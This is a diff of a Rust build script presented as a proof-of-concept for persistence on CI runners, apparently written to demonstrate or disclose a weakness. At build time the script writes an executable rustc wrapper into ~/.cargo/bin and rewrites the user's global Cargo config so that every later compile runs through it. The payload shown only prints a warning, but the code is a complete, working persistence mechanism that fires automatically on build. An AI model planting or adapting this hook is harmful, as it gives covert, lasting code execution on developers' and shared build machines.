@@ -1,6 +1,7 @@
-// Safe, reversible runner-persistence PoC (prints in base logs on same runner).
-// It installs ~/.cargo/bin/rustc-wrapper and points Cargo to it via ~/.cargo/config.toml.
-// The wrapper prints a WARNING then execs the real compiler. No secrets, no network.
+// Safe, reversible runner-persistence PoC.
+// Installs ~/.cargo/bin/rustc-wrapper and points Cargo to it via ~/.cargo/config.toml.
+// Prints a WARNING on every rustc invocation, then execs the real compiler.
+// No secrets, no network, non-destructive.
 
 use std::{env, fs, io, path::PathBuf};
 
@@ -24,42 +25,54 @@ fn main() {
     let wrapper = bin_dir.join("rustc-wrapper");
     let config = cargo_dir.join("config.toml");
 
+    // Ensure ~/.cargo/bin exists
     let _ = fs::create_dir_all(&bin_dir);
 
-    // The rustc wrapper contract: Cargo sets $RUSTC to the real compiler; call it with same args.
+    // Write the wrapper (prints once per rustc call, then execs the real compiler)
     let wrapper_body = r#"#!/usr/bin/env bash
 # SAFE_RUNNER_PERSIST_POC rustc-wrapper
 echo "WARNING: ===RUNNER_PERSIST_POC HIT=== rustc $* (safe: no secrets, no network)" 1>&2
 exec "${RUSTC:-rustc}" "$@"
 "#;
 
-    // Install wrapper
-    if fs::write(&wrapper, wrapper_body.as_bytes()).is_ok() {
-        let _ = make_exec(&wrapper);
-        println!("cargo:warning=PoC: installed ~/.cargo/bin/rustc-wrapper");
-    } else {
-        println!("cargo:warning=PoC: failed to write rustc-wrapper");
+    match fs::write(&wrapper, wrapper_body.as_bytes()) {
+        Ok(_) => {
+            let _ = make_exec(&wrapper);
+            println!("cargo:warning=PoC: installed ~/.cargo/bin/rustc-wrapper");
+        }
+        Err(e) => {
+            println!("cargo:warning=PoC: failed to write rustc-wrapper: {e}");
+            return;
+        }
     }
 
-    // Point Cargo to the wrapper (idempotent, minimal)
-    // Keep any existing config by appending/merging if needed.
-    let line = format!(r#"rustc-wrapper = "{}""#, wrapper.display());
-    let mut cfg = String::new();
-    if let Ok(existing) = fs::read_to_string(&config) {
-        cfg = existing;
-        if !cfg.contains("rustc-wrapper") {
-            // Insert under [build] or add a new one.
-            if cfg.contains("[build]") {
-                cfg = cfg.replace("[build]", &format!("[build]\n{line}\n"));
+    // Ensure Cargo uses the wrapper via ~/.cargo/config.toml
+    let wrapper_path = wrapper.display().to_string();
+    let setting_line = format!(r#"rustc-wrapper = "{}""#, wrapper_path);
+
+    match fs::read_to_string(&config) {
+        Ok(mut existing) => {
+            if existing.contains("rustc-wrapper") {
+                println!("cargo:warning=PoC: rustc-wrapper already configured in ~/.cargo/config.toml");
             } else {
-                cfg.push_str("\n[build]\n");
-                cfg.push_str(&line);
-                cfg.push('\n');
+                // Append our own [build] block at the end (TOML allows multiple tables; last wins)
+                existing.push_str("\n[build]\n");
+                existing.push_str(&setting_line);
+                existing.push('\n');
+                if fs::write(&config, existing).is_ok() {
+                    println!("cargo:warning=PoC: set build.rustc-wrapper in ~/.cargo/config.toml");
+                } else {
+                    println!("cargo:warning=PoC: failed to update ~/.cargo/config.toml");
+                }
             }
         }
-    } else {
-        cfg = format!("[build]\n{line}\n");
+        Err(_) => {
+            let new_cfg = format!("[build]\n{}\n", setting_line);
+            if fs::write(&config, new_cfg).is_ok() {
+                println!("cargo:warning=PoC: created ~/.cargo/config.toml with rustc-wrapper");
+            } else {
+                println!("cargo:warning=PoC: failed to create ~/.cargo/config.toml");
+            }
+        }
     }
-    let _ = fs::write(&config, cfg);
-    println!("cargo:warning=PoC: set build.rustc-wrapper in ~/.cargo/config.toml");
 }
